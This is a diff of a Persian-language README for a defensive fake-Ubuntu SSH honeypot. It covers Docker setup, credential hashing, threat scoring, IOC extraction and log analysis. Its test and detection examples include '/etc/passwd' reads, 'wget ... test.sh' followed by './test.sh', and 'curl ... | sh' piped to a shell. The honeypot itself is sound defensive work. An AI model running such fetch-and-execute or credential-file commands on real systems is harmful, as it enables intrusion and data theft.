+سیستم می‌تواند Indicatorهای زیر را از فرمان‌ها استخراج کند:
+
+- IP
+- Domain
+- URL
+- File
+- Artifact
+- MD5
+- SHA-256
+
+مثلاً:
+
+```bash
+wget http://example.com/test.sh
+```
+
+می‌تواند موارد زیر را ثبت کند:
+
+```text
+example.com
+http://example.com/test.sh
+test.sh
+```
+
+---
+
+# 📊 امتیازدهی Threat
+
+سطوح Threat:
+
+| امتیاز | سطح |
+|---:|---|
+| کمتر از 10 | NONE |
+| 10 تا 29 | LOW |
+| 30 تا 59 | MEDIUM |
+| 60 تا 89 | HIGH |
+| 90 به بالا | CRITICAL |
+
+---
+
+# 🚀 نصب سریع با Docker
+
+## ۱. Clone
+
+```bash
+git clone https://github.com/zero19bit/SSH-Honeypot.git
+cd SSH-Honeypot
+```
+
+---
+
+## ۲. Build
+
+```bash
+docker compose build --pull
+```
+
+---
+
+## ۳. ساخت Host Key
+
+```bash
+docker run --rm --entrypoint python \
+  fake-ubuntu-ssh-honeypot:3.0.1 \
+  -m honeypot.keygen > host-key.b64
+```
+
+---
+
+## ۴. ساخت `.env`
+
+```bash
+cp .env.example .env
+chmod 600 .env
+```
+
+فایل را باز کنید:
+
+```bash
+nano .env
+```
+
+مقدار `host-key.b64` را مقابل:
+
+```dotenv
+HONEYPOT_HOST_KEY_B64=
+```
+
+قرار دهید.
+
+Credential mode در Production بهتر است:
+
+```dotenv
+HONEYPOT_CREDENTIAL_LOG_MODE=sha256
+```
+
+باشد.
+
+---
+
+## ۵. اجرا
+
+```bash
+docker compose up -d
+```
+
+وضعیت:
+
+```bash
+docker compose ps
+```
+
+باید در نهایت:
+
+```text
+healthy
+```
+
+نمایش داده شود.
+
+---
+
+## ۶. مشاهده Log
+
+```bash
+docker compose logs --tail=50 honeypot
+```
+
+---
+
+## ۷. اتصال SSH
+
+```bash
+ssh -p 2222 \
+  -o PreferredAuthentications=password \
+  -o PubkeyAuthentication=no \
+  root@127.0.0.1
+```
+
+---
+
+# 🧪 تست پیشنهادی
+
+بعد از ورود:
+
+```bash
+whoami
+uname -a
+cat /etc/passwd
+wget http://example.com/test.sh
+./test.sh
+exit
+```
+
+سپس:
+
+```bash
+docker compose logs --tail=100 honeypot
+```
+
+در Log باید اطلاعاتی مانند:
+
+```text
+system_discovery
+passwd_file_access
+payload_download
+download_then_execute
+```
+
+را بسته به Commandهای اجراشده مشاهده کنید.
+
+---
+
+# 💻 اجرای مستقیم Development
+
+```bash
+python3 -m venv .venv
+source .venv/bin/activate
+```
+
+نصب:
+
+```bash
+python -m pip install --require-hashes -r requirements.lock
+```
+
+اجرا:
+
+```bash
+python -m honeypot \
+  --development \
+  --host 127.0.0.1 \
+  --port 2222
+```
+
+اگر 2222 اشغال بود:
+
+```bash
+python -m honeypot \
+  --development \
+  --host 127.0.0.1 \
+  --port 2223
+```
+
+---
+
+# 🔐 نحوه ذخیره Password
+
+حالت Production به‌صورت پیش‌فرض:
+
+```dotenv
+HONEYPOT_CREDENTIAL_LOG_MODE=sha256
+```
+
+است.
+
+در نتیجه Password خام ذخیره نمی‌شود.
+
+مثال:
+
+```json
+{
+  "password_sha256": "...",
+  "password_length": 4
+}
+```
+
+حالت‌های موجود:
+
+```text
+sha256
+redact
+plain
+```
+
+اما `plain` در Production مجاز نیست و فقط برای Development در نظر گرفته شده است.
+
+---
+
+# 📝 دریافت Log به صورت JSONL
+
+```bash
+docker compose logs \
+  --no-color \
+  --no-log-prefix \
+  honeypot > honeypot.jsonl
+```
+
+---
+
+# 🔍 تحلیل Log
+
+```bash
+python3 tools/analyze_log.py honeypot.jsonl
+```
+
+یا:
+
+```bash
+python3 tools/analyze_log.py honeypot.jsonl --json
+```
+
+---
+
+# 🗄 ساخت دیتابیس SQLite آفلاین
+
+```bash
+python3 tools/intel_report.py \
+  ingest honeypot.jsonl \
+  --db intel.sqlite
+```
+
+گزارش:
+
+```bash
+python3 tools/intel_report.py \
+  report \
+  --db intel.sqlite
+```
+
+JSON:
+
+```bash
+python3 tools/intel_report.py \
+  report \
+  --db intel.sqlite \
+  --json
+```
+
+---
+
+# 🧪 اجرای تست‌ها
 
 ```bash
 python3 -m venv .venv
@@ -139,191 +1677,307 @@ pip install -r requirements-dev.txt
 pytest -q
 ```
 
-اگر وابستگی‌های توسعه نصب نشده باشند، `conftest.py` قبل از جمع‌آوری تست‌ها
-نام بسته‌های مفقود و دستور نصب را نمایش می‌دهد. اگر خود `pytest` هنوز نصب
-نباشد، ابتدا سه فرمان اول را اجرا کنید. برای audit وابستگی‌ها نیز:
+یا:
+
+```bash
+make test
+```
+
+---
+
+# 🔐 Dependency Audit
 
 ```bash
 pip-audit -r requirements.lock
 ```
 
-تست‌ها شامل command/filesystem behavior، session isolation، terminal controls،
-no-exec/no-open invariants، resource exhaustion، rate limiter، credential modes،
-Host Key stability و اتصال واقعی client/server با Paramiko هستند.
+---
 
-## فرمان‌های شبیه‌سازی‌شده
+# 🐳 Docker Build Test
 
-| گروه | فرمان‌ها |
-|---|---|
-| سیستم | whoami, id, hostname, uname, uptime, date, history |
-| فایل | ls, ll, cd, pwd, cat, head, tail, find, touch, mkdir, rm, nano, vim |
-| شبکه | ip, ifconfig, netstat, ss, ping |
-| منابع | ps, top, free, df, du |
-| مدیریت | systemctl, service, apt, apt-get |
-| ابزار | wget, curl, python3, git, docker, docker compose |
+```bash
+make docker
+```
 
-زنجیره‌های محدود ; و && و || و pipeline با grep، head و tail نیز داخل parser
-داخلی اجرا می‌شوند؛ هیچ shell واقعی در مسیر نیست.
+یا:
 
-## متغیرهای مهم
+```bash
+docker compose build
+```
 
-| متغیر | پیش‌فرض | کاربرد |
-|---|---:|---|
-| HONEYPOT_HOST_KEY_B64 | اجباری در Production | RSA private key به‌صورت base64 |
-| HONEYPOT_CREDENTIAL_LOG_MODE | sha256 | sha256 یا redact در Production؛ plain فقط در Development |
-| HONEYPOT_ALERT_MIN_RISK | 65 | حداقل امتیاز برای هشدار JSONL |
-| HONEYPOT_INTELLIGENCE_ENABLED | true | فعال‌بودن تحلیل رفتار |
-| HONEYPOT_IOC_ENABLED | true | استخراج IOC |
-| HONEYPOT_MAX_SESSION_HISTORY | 500 | اندازهٔ حلقهٔ سابقهٔ ساختاریافتهٔ سشن |
-| HONEYPOT_MAX_SCORE | 1000 | سقف امتیاز هر فرمان و سشن |
-| HONEYPOT_LOG_HASHING | true | زنجیرهٔ SHA-256 هر فرایند |
-| HONEYPOT_MAX_CONNECTIONS | 64 | اتصال فعال سراسری |
-| HONEYPOT_MAX_CONNECTIONS_PER_IP | 4 | اتصال فعال هر IP |
-| HONEYPOT_GLOBAL_RATE_PER_MINUTE | 120 | نرخ پذیرش سراسری |
-| HONEYPOT_IP_RATE_PER_MINUTE | 12 | نرخ پذیرش هر IP |
-| HONEYPOT_MAX_SESSION_SECONDS | 900 | سقف عمر session |
-| HONEYPOT_VFS_MAX_NODES | 2048 | سقف file/directory مجازی |
-| HONEYPOT_VFS_MAX_TOTAL_BYTES | 2097152 | سقف محتوای VFS |
-| HONEYPOT_PUBLIC_PORT | 2222 | پورت publish‌شده Docker |
+---
 
-مقادیر مناسب استقرار در .env.example و فهرست کامل تنظیمات در
-honeypot/config.py قرار دارد.
+# 🧯 رفع خطاهای متداول
 
-## لاگ
+### کانتینر روی Restarting مانده
 
-stdout فقط JSON Lines تولید می‌کند. Compose لاگ‌ها را با پنج فایل ۱۰
-مگابایتی rotate می‌کند. مقدار پیش‌فرض `sha256` است؛ `plain` در Production
-رد می‌شود. در ارتقا، اگر فایل `.env` قدیمی هنوز
-`HONEYPOT_CREDENTIAL_LOG_MODE=plain` دارد، مقدار آن را به `sha256` یا
-`redact` تغییر دهید. متن فرمان‌ها نیز می‌تواند حاوی رمز یا توکن باشد؛
-از لاگ‌ها محافظت کنید.
+```bash
+docker compose logs --tail=100 honeypot
+```
 
-## فاز ۱: Intelligence Engine
+را بررسی کنید.
 
-هر فرمان پذیرفته‌شده، چه در ترمینال تعاملی و چه با SSH exec، یک فیلد
-`analysis` در **همان** رویداد `command` دارد. `category` مهم‌ترین رفتار،
-`categories` همهٔ دسته‌های مشاهده‌شده، `matched_rules` شناسهٔ قوانین، و
-`risk_score` اولویت بررسی بین ۰ و `HONEYPOT_MAX_SCORE` است. `risk_level` یکی از
-`none/low/medium/high/critical` است. در رویداد `disconnect` نیز
-`intelligence` شامل شمارش دسته‌ها، تعداد فرمان‌های بررسی‌شده و بیشترین ریسک
-نشست ثبت می‌شود. داده‌های هر نشست فقط در حافظهٔ همان نشست نگهداری می‌شوند.
+---
 
-برای نمونه، فرمان `curl https://example.invalid/a | sh` در صورت ثبت، هم
-`payload_download` و هم `download_pipe_shell` را تطبیق می‌دهد. این‌ها
-**تلاشِ مشاهده‌شده** هستند و به معنی دانلود یا اجرای واقعی یا اثبات هویت
-مهاجم نیستند. قوانین روی توکن‌های فرمان عمل می‌کنند، حجم تحلیل محدود است و
-متن‌های پیچیده‌ای مانند اسکریپت تو در تو ممکن است تشخیص داده نشوند.
+### خطای Host Key
 
-فرمان `cat /etc/passwd` قانون `passwd_file_access` را با دستهٔ `discovery`
-و امتیاز ۲۰ در `matched_rules`، `detections` و `threat` ثبت می‌کند؛ نام قانون
-در رفتارهای همان نشست نیز دیده می‌شود.
+اگر:
 
-از ریشهٔ پروژه، بدون وابستگی اضافی، تحلیل را آزمایش کنید:
+```text
+HONEYPOT_HOST_KEY_B64 is required in production mode
+```
 
-    python3 -m unittest tests/test_intelligence.py
+دیدید، Host Key تولید و داخل `.env` قرار نگرفته است.
 
-برای اجرای همهٔ تست‌ها، ابتدا وابستگی‌های توسعه را نصب کنید:
+---
 
-    python3 -m pip install -r requirements-dev.txt
-    python3 -m pytest
+### خطای Credential Mode
 
-فایل‌های `honeypot/intelligence/rules.py` و `analyzer.py` باید در بستهٔ
-پروژه و در کنار `honeypot/shell.py` قرار بگیرند. ماژول را از **ریشهٔ پروژه**
-با `from honeypot.intelligence.analyzer import Analyzer` وارد کنید؛ اجرای یک
-فایل داخل پوشهٔ `honeypot` با import نسبی سازگار نیست.
+اگر:
 
-## قابلیت‌های نسخهٔ ۳
+```text
+credential_log_mode must be plain, sha256, or redact
+```
 
-تحلیلگر در هر نشست حداکثر ۱۶ نام فایل دانلودشده و ۱۶ میزبان اخیر را
-نگه می‌دارد. اگر مثلاً ابتدا `wget -O /tmp/run.sh ...` و سپس
-`sh /tmp/run.sh` مشاهده شود، قانون `download_then_execute` فعال می‌شود.
-این همبستگی صرفاً بر اساس **نام فایل و تلاش ثبت‌شده** است؛ موفقیت دانلود
-یا اجرای برنامه را اثبات نمی‌کند. در ۳.۰.۱ کش تحلیلگر متن خام فرمان را
-نگه نمی‌دارد؛ IOC می‌تواند URL کوتاه پاک‌سازی‌شده با میزبان و نام فایل
-شناخته‌شده را داشته باشد. `analysis` فیلدهای `primary_rule`، `stages`
-و `indicators` نسخهٔ قبل را حفظ می‌کند؛ userinfo، query و مسیرهای ناشناس
-URL در IOCها ذخیره نمی‌شوند.
+مشاهده شد، مقدار زیر را بررسی کنید:
 
-وقتی ریسک به حد `HONEYPOT_ALERT_MIN_RISK` برسد (پیش‌فرض ۶۵)، رویداد
-`intelligence_alert` در همان JSONL صادر می‌شود. هر قانون اصلی در هر نشست
-فقط یک بار هشدار می‌دهد. هشدار شامل متن فرمان نیست و ارتباط بیرونی
-برقرار نمی‌کند. خلاصهٔ `disconnect` مراحل مشاهده‌شده و تعداد هشدارها را
-هم دارد. حد هشدار را می‌توان با `--alert-min-risk 75` نیز تعیین کرد.
+```dotenv
+HONEYPOT_CREDENTIAL_LOG_MODE=sha256
+```
 
-### گزارش و پایگاه‌دادهٔ آفلاین
+---
 
-ابزار گزارش **در سرویس SSH اجرا یا import نمی‌شود** و روی رایانهٔ تحلیلگر
-یا میزبان جداگانه با فایل JSONL اجرا می‌شود:
+### خطای اشغال بودن پورت
 
-    python3 tools/intel_report.py ingest honeypot.jsonl --db intel.sqlite
-    python3 tools/intel_report.py report --db intel.sqlite
-    python3 tools/intel_report.py report --db intel.sqlite --json
+اگر:
 
-برای گرفتن JSONL از Compose:
+```text
+Bind for 127.0.0.1:2222 failed:
+port is already allocated
+```
 
-    docker compose logs --no-color --no-log-prefix honeypot > honeypot.jsonl
+ابتدا:
 
-ورود مجدد همان فایل با همان مسیر و شمارهٔ خط تکراری ایجاد نمی‌کند.
-تعداد سطرهای واردشده، تکراری و نامعتبر در پاسخ `ingest` مشخص می‌شود.
-اگر محتوای همان مسیر عوض شد، برای ورود تازه از `--source-id` متفاوت
-استفاده کنید.
-پایگاه‌داده به‌طور پیش‌فرض فقط متادیتای رویداد و تحلیل را نگه می‌دارد؛
-**هیچ پسوردی ذخیره نمی‌کند**. اگر متن خام فرمان‌ها را هم می‌خواهید، گزینهٔ
-`--include-commands` را هنگام `ingest` اضافه کنید و فایل SQLite را مانند
-لاگ حساس محافظت کنید. داده‌های `plain` در JSONL اصلی همچنان حساس هستند.
+```bash
+docker ps
+```
 
-تست‌های مستقل نسخهٔ ۳ را از ریشهٔ پروژه اجرا کنید:
+را اجرا کنید.
 
-    python3 -m unittest tests/test_intelligence_v3.py tests/test_intel_report.py
+سپس Container قدیمی را Stop کنید یا:
 
-قوانین و همبستگی مبتنی بر نشانه‌اند: فرمان‌های داخل اسکریپت‌های تو در تو،
-نام فایل‌های تغییرکرده و همهٔ روش‌های خروج داده را پوشش نمی‌دهند.
+```dotenv
+HONEYPOT_PUBLIC_PORT=2223
+```
 
-## تغییرات ۳.۰.۱: تحلیل و یکپارچگی
+قرار دهید.
 
-هر `Rule` متادیتای `name`, `patterns`, `type`, `score`, `severity`,
-`category`, `mitre`, `confidence`, `description` دارد. تطبیق regex فقط روی
-فراخوانی‌های parse‌شده انجام می‌شود؛ متن نمونه در `echo` نباید Reverse Shell
-تشخیص داده شود. هر Detection دارای `confidence_score` (۰ تا ۱) و
-`confidence_level` است: زیر ۰٫۳ `LOW`، از ۰٫۳ تا زیر ۰٫۷ `MEDIUM` و
-از ۰٫۷ به بالا `HIGH`. برچسب MITRE تا زمان اعتبارسنجی خالی است.
+---
 
-`analysis.threat` امتیاز ترکیبی و سطح `NONE` (زیر ۱۰)، `LOW` (۱۰ تا ۲۹)،
-`MEDIUM` (۳۰ تا ۵۹)، `HIGH` (۶۰ تا ۸۹) یا `CRITICAL` (۹۰ به بالا) دارد.
-فیلدهای v3 (`risk_score`، `risk_level`، `matched_rules` و غیره) همچنان
-موجود هستند؛ `risk_level` با آستانه‌های قبلی v3 باقی مانده است.
-`session.threat_score` مجموع امتیاز قانون‌های یکتای آن نشست با سقف ۱۰۰۰
-است؛ تکرار `uname -a` آن را افزایش نمی‌دهد. ساختار
-`session.command_history` در حافظه تا ۵۰۰ رکورد زمان/فرمان/امتیاز/دسته
-نگه می‌دارد و با بستن نشست آزاد می‌شود. سابقهٔ معمول shell همان
-`HONEYPOT_HISTORY_LIMIT` پیشین است.
+### خطای تغییر SSH Host Key
 
-رویدادهای JSONL دارای `timestamp`, `event`, `session_id`, `attacker_ip`,
-`threat`, `detections` و `ioc` هستند. رویدادهای فرمان، نام `command` و
-فیلد `analysis` قبلی را حفظ می‌کنند؛ alert متن فرمان را تکرار نمی‌کند.
-`integrity.prev_hash` و `integrity.hash` هش SHA-256 زنجیرهٔ خروجی همان
-فرایندند. دستکاری/حذف در یک فایل کامل را می‌توان دید؛ بدون کلید امضا،
-این هش اثبات اصالت در برابر فردی که همهٔ لاگ را بازنویسی کند نیست.
-لاگ خام همچنان ممکن است پسورد و متن فرمان حساس داشته باشد.
+اگر:
 
-برای جمع‌بندی آفلاین و بررسی یک فایل لاگ از یک اجرای فرایند:
+```text
+REMOTE HOST IDENTIFICATION HAS CHANGED
+```
 
-    python3 tools/analyze_log.py honeypot.jsonl
-    python3 tools/analyze_log.py honeypot.jsonl --json
+مشاهده شد:
 
-خروجی `Top Commands` فقط نام برنامه را نمایش می‌دهد، نه آرگومان یا رمز.
-کد خروج ۲ نشان‌دهندهٔ خط نامعتبر/زنجیرهٔ خراب است؛ لاگ قدیمی بدون هش
-`UNVERIFIED` گزارش می‌شود. healthcheck Docker هر ۳۰ ثانیه اتصال TCP
-محلی می‌زند و ممکن است رویداد اتصال ناموفق ایجاد کند.
+```bash
+ssh-keygen \
+  -f ~/.ssh/known_hosts \
+  -R '[127.0.0.1]:2222'
+```
 
-## نکات الزامی
+سپس دوباره اتصال را برقرار کنید.
 
-- روی سروری که اطلاعات یا workload مهم دارد اجرا نکنید.
-- process را با sudo python و مستقیم روی پورت ۲۲ اجرا نکنید.
-- ابتدا SSH مدیریتی را به مسیر امن دیگری منتقل کنید.
-- علاوه بر شبکه داخلی Docker، egress را در firewall/cloud policy نیز ببندید.
-- .env و Host Key را commit نکنید.
-- قبل از هر release تست، audit و container build را اجرا کنید.
+---
 
-جزئیات کامل استقرار، پورت ۲۲، rotation، ارتقا و بازیابی در OPERATIONS.md و
-مدل تهدید در SECURITY.md آمده است.
+### خطای Docker Hub 403
+
+```bash
+docker login
+```
+
+بعد:
+
+```bash
+docker pull python:3.12-slim-bookworm
+```
+
+و دوباره:
+
+```bash
+docker compose build
+```
+
+---
+
+# 🛡 نکات امنیتی مهم
+
+این پروژه را روی سیستمی که اطلاعات یا سرویس مهم دارد اجرا نکنید.
+
+برای Deployment اینترنتی:
+
+1. از VPS یا VM جدا استفاده کنید.
+2. Honeypot را کنار Production Workload قرار ندهید.
+3. SSH مدیریتی واقعی را از endpoint هانی‌پات جدا کنید.
+4. Egress کانتینر را در Firewall سیستم یا Cloud Policy ببندید.
+5. `.env` را Commit نکنید.
+6. Host Private Key را Commit نکنید.
+7. دسترسی به Logها را محدود کنید.
+8. Log Retention تعریف کنید.
+9. قبل از Upgrade تست و Audit انجام دهید.
+10. سرویس را با Root اجرا نکنید.
+
+---
+
+# 🚫 فایل‌هایی که نباید روی GitHub بروند
+
+```text
+.env
+.venv/
+host-key.b64
+honeypot_host_key
+honeypot_host_key.pub
+*.log
+*.jsonl
+__pycache__/
+.pytest_cache/
+```
+
+---
+
+# ⚠️ نکته درباره Egress
+
+Docker Compose فعلی:
+
+```text
+internal: false
+```
+
+دارد.
+
+بنابراین Docker network به تنهایی مانع دسترسی خروجی نیست.
+
+قبل از انتشار Honeypot روی اینترنت، Egress کانتینر را با:
+
+- Host Firewall
+- Cloud Firewall
+- Network Policy
+
+محدود کنید.
+
+---
+
+# 🌍 انتشار عمومی
+
+به‌صورت پیش‌فرض:
+
+```dotenv
+HONEYPOT_PUBLIC_BIND=127.0.0.1
+```
+
+است.
+
+بعد از اعمال محدودیت‌های شبکه، برای انتشار عمومی:
+
+```dotenv
+HONEYPOT_PUBLIC_BIND=0.0.0.0
+```
+
+قرار دهید.
+
+---
+
+# ⚠️ استفاده از پورت 22
+
+قبل از اینکه Honeypot را روی پورت `22` منتشر کنید، SSH مدیریتی واقعی خود را به مسیر دیگری منتقل کنید.
+
+بعد:
+
+```dotenv
+HONEYPOT_PUBLIC_PORT=22
+```
+
+قرار دهید.
+
+---
+
+# 🛑 توقف
+
+```bash
+docker compose down --timeout 15
+```
+
+با توقف سرویس:
+
+- Listener بسته می‌شود
+- Connectionها قطع می‌شوند
+- Workerها فرصت خروج دارند
+- صف Log flush می‌شود
+- VFSهای داخل RAM از بین می‌روند
+
+---
+
+# ⚖️ استفاده مسئولانه
+
+این پروژه برای موارد زیر طراحی شده است:
+
+- Defensive Security
+- Cybersecurity Research
+- Threat Intelligence
+- Honeypot Research
+- آموزش امنیت
+- آزمایشگاه‌های کنترل‌شده
+- مانیتورینگ مجاز
+
+فقط روی زیرساختی استفاده کنید که مالک آن هستید یا مجوز مانیتورینگ آن را دارید.
+
+جمع‌آوری IP، Password Attempt، Command History و سایر اطلاعات ممکن است مشمول قوانین حریم خصوصی یا الزامات قانونی محل استقرار سرور باشد.
+
+مسئولیت رعایت قوانین بر عهده اپراتور Honeypot است.
+
+---
+
+# 📚 مستندات بیشتر
+
+فایل‌های زیر اطلاعات تکمیلی پروژه را دارند:
+
+```text
+SECURITY.md
+OPERATIONS.md
+CHANGELOG.md
+RELEASE.md
+```
+
+---
+
+# 🏷 Current Release
+
+```text
+Fake Ubuntu SSH Honeypot
+Version 3.0.1
+```
+
+بررسی نسخه:
+
+```bash
+python -m honeypot --version
+```
+
+---
+
+## ⭐ Support the Project
+
+If you find this project useful:
+
+- ⭐ Star the repository
+- 🐛 Report reproducible bugs
+- 🔐 Report security issues responsibly
+- 🧪 Add tests for new behavior
+- 📖 Improve documentation
+- 🛡 Preserve the project's isolation and no-real-execution security invariants
+
+**Built for defensive security research and threat observation.**
